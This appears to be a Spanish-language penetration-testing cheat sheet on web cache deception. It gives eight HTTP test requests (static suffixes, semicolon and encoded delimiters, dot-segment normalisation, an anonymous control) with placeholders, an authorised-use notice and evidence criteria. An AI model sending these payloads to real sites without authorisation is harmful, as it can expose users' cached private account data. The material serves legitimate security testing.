# 🗡️ Web Cache Deception: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 🔬 Pruebas por escenario

### 1. Extensión estática

**Objetivo:** Comparar respuesta privada y ruta con sufijo estático en cuenta propia.

```http
GET /my-account/{ID_PROPIO}/canary-{NONCE}.css HTTP/1.1
Host: {ORIGEN}
Cookie: session={COOKIE_PROPIA}
```

**Interpretación:** Repetir sin cookie desde otra sesión. Solo hay fuga si muestra datos privados de la primera cuenta.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/web-cache-deception).

### 2. Delimitador punto y coma

**Objetivo:** Detectar si origen trunca la ruta y caché conserva sufijo.

```http
GET /my-account;canary-{NONCE}.js HTTP/1.1
Host: {ORIGEN}
Cookie: session={COOKIE_PROPIA}
```

**Interpretación:** Comparar cuerpo con `/my-account` y después sin cookie; confirmar HIT en misma URL.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/web-cache-deception).

### 3. Delimitador hash codificado

**Objetivo:** Comprobar decodificación distinta entre capas.

```http
GET /my-account%23canary-{NONCE}.css HTTP/1.1
Host: {ORIGEN}
Cookie: session={COOKIE_PROPIA}
```

**Interpretación:** El navegador no envía `#` literal; `%23` sí. Registrar ruta interpretada por origen y caché.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/web-cache-deception).

### 4. Interrogación codificada

**Objetivo:** Buscar regla de archivo estático aplicada antes de decodificar `%3f`.

```http
GET /my-account%3fcanary-{NONCE}.css HTTP/1.1
Host: {ORIGEN}
Cookie: session={COOKIE_PROPIA}
```

**Interpretación:** Verificar si el origen trata `?` como delimitador y devuelve perfil mientras caché almacena `.css`.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/web-cache-deception).

### 5. Normalización de dot-segments

**Objetivo:** Comparar path normalizado por caché y original por backend.

```http
GET /my-account;%2f%2e%2e%2fstatic HTTP/1.1
Host: {ORIGEN}
Cookie: session={COOKIE_PROPIA}
```

**Interpretación:** Necesita regla de `/static` y delimitador `;` en origen. Confirmar dos interpretaciones, no solo status.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/web-cache-deception).

### 6. Nombre exacto cacheable

**Objetivo:** Comprobar una regla de archivo como `favicon.ico` en ruta propia.

```http
GET /my-account/{ID_PROPIO}/favicon.ico HTTP/1.1
Host: {ORIGEN}
Cookie: session={COOKIE_PROPIA}
```

**Interpretación:** Solo impacto si backend devuelve datos privados y segunda sesión los lee desde caché.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/web-cache-deception).

### 7. Control anónimo

**Objetivo:** Descartar que el contenido mostrado sea público.

```http
GET /my-account;canary-{NONCE}.js HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Comparar cuerpo y cabeceras con solicitud autenticada a la misma URL única.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/web-cache-deception).

### 8. Encabezados de caché

**Objetivo:** Inspeccionar política de respuesta privada.

```bash
curl -I "https://{ORIGEN}/my-account" | rg -i "cache-control|age|x-cache|vary"
```

**Interpretación:** HEAD es preliminar; confirmar con GET porque CDN y backend pueden tratarlo distinto.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/web-cache-deception).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
